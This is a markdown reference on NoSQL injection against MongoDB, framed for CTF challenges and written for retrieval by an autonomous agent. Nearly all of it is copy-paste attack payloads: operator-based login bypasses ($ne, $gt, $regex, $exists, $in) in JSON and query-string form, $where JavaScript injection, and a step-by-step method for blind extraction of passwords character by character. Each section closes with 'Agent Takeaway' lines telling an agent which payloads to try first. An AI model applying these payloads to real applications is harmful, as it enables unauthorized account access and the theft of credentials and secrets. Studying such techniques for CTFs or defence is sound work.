# NoSQL Injection - CTF Exploitation Reference

> **Document Purpose:** Actionable NoSQL injection techniques for CTF challenges,
> focused on MongoDB. Designed for autonomous agent retrieval with copy-paste
> payloads and extraction methodology.

---

## 1. QUICK REFERENCE: Detection

> **When to use this section:** You suspect the backend uses MongoDB or another
> NoSQL database for authentication or data storage.

### 1.1 Detection Indicators

**Tags:** `nosql, injection, detection, mongodb, indicators`

Look for these signs:
- Login forms or API endpoints that might use MongoDB
- JSON-based APIs (common with Node.js/Express backends)
- Error messages: `MongoError`, `BSONObj`, `MongoServerError`, `$operator`
- Challenge mentions: "NoSQL", "MongoDB", "document database", "MEAN stack"
- Node.js/Express indicators in response headers

### 1.2 Quick Test Payloads

**Tags:** `nosql, quick-test, payloads, auth-bypass`

**Query Parameter Format (try in URL or form):**
```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

**JSON Body Format (for API endpoints):**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

**Agent Takeaway:**
- Try BOTH query parameter AND JSON body formats
- `$ne` (not equal to empty) is the most common bypass
- Use `nosql_probe` tool for automated testing
- If the app uses JSON content type, prefer JSON body injection

---

## 2. AUTHENTICATION BYPASS

> **When to use this section:** You need to bypass a login form backed by MongoDB.

### 2.1 Operator-Based Bypass

**Tags:** `nosql, auth-bypass, operators, mongodb`

**Bypass both username and password:**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Target specific user:**
```json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
```

**Using $exists:**
```json
{"username": {"$exists": true}, "password": {"$exists": true}}
```

**Using $in:**
```json
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}
```

### 2.2 Query Parameter Bypass

**Tags:** `nosql, query-param, bypass, bracket-notation`

For form submissions (non-JSON):
```
username[$ne]=&password[$ne]=
username=admin&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=admin&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### 2.3 JavaScript Injection ($where)

**Tags:** `nosql, where, javascript, injection`

If `$where` is accepted:
```json
{"username": {"$where": "return true"}, "password": "anything"}
{"$where": "this.username == 'admin'"}
{"$where": "return this.password.length > 0"}
```

Query parameter format:
```
username[$where]=return true
```

**Agent Takeaway:**
- Start with `{"$ne": ""}` — it's the simplest and most reliable bypass
- If targeting a specific user, use `"admin"` for username with `{"$ne": ""}` for password
- `$where` allows JavaScript execution but is less common (often disabled)
- Always try both parameter formats (query string vs JSON body)

---

## 3. BLIND DATA EXTRACTION

> **When to use this section:** You can inject NoSQL operators but need to extract
> specific data (like passwords or flags) character by character.

### 3.1 Regex-Based Extraction

**Tags:** `nosql, blind, regex, data-extraction, character-by-character`

**Methodology:** Use `$regex` to test characters one at a time.

**Step 1: Determine first character:**
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
{"username": "admin", "password": {"$regex": "^c"}}
...
```

**Step 2: Build the string character by character:**
```json
{"username": "admin", "password": {"$regex": "^a."}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
...
```

**Step 3: Determine length:**
```json
{"username": "admin", "password": {"$regex": "^.{1}$"}}
{"username": "admin", "password": {"$regex": "^.{2}$"}}
{"username": "admin", "password": {"$regex": "^.{3}$"}}
```

### 3.2 Comparison-Based Extraction

**Tags:** `nosql, blind, comparison, gt-lt`

Use `$gt` and `$lt` for binary search:
```json
{"username": "admin", "password": {"$gt": "a", "$lt": "z"}}
{"username": "admin", "password": {"$gt": "m"}}
{"username": "admin", "password": {"$gt": "s", "$lt": "v"}}
```

### 3.3 Extracting Field Names

**Tags:** `nosql, enumeration, field-names`

Use `$exists` to discover fields:
```json
{"flag": {"$exists": true}}
{"secret": {"$exists": true}}
{"token": {"$exists": true}}
{"key": {"$exists": true}}
```

**Agent Takeaway:**
- Regex extraction is slow but reliable — test one character at a time
- Use `$regex: "^known_prefix"` and append new characters
- The boolean oracle is: login succeeds (true) vs login fails (false)
- Use `nosql_payload_generator` with `data_extraction` operation for templates
- Check for fields named `flag`, `secret`, `token` using `$exists`

---

## 4. MONGODB OPERATOR REFERENCE

> **When to use this section:** You need a quick reference of MongoDB operators
> for crafting custom payloads.

### 4.1 Comparison Operators

**Tags:** `nosql, operators, comparison, reference`

| Operator | Meaning | Example |
|----------|---------|---------|
| `$eq` | Equal | `{"field": {"$eq": "value"}}` |
| `$ne` | Not equal | `{"field": {"$ne": ""}}` |
| `$gt` | Greater than | `{"field": {"$gt": ""}}` |
| `$gte` | Greater/equal | `{"field": {"$gte": "a"}}` |
| `$lt` | Less than | `{"field": {"$lt": "z"}}` |
| `$lte` | Less/equal | `{"field": {"$lte": "z"}}` |
| `$in` | In array | `{"field": {"$in": ["a","b"]}}` |
| `$nin` | Not in array | `{"field": {"$nin": ["x"]}}` |

### 4.2 Evaluation Operators

**Tags:** `nosql, operators, evaluation, regex, where`

| Operator | Meaning | Example |
|----------|---------|---------|
| `$regex` | Regex match | `{"field": {"$regex": "^admin"}}` |
| `$exists` | Field exists | `{"field": {"$exists": true}}` |
| `$type` | Field type | `{"field": {"$type": "string"}}` |
| `$where` | JavaScript | `{"$where": "return true"}` |

**Agent Takeaway:**
- `$ne` and `$gt` are the workhorses for auth bypass
- `$regex` is essential for blind data extraction
- `$exists` helps discover unknown field names
- `$where` is powerful but often disabled in production
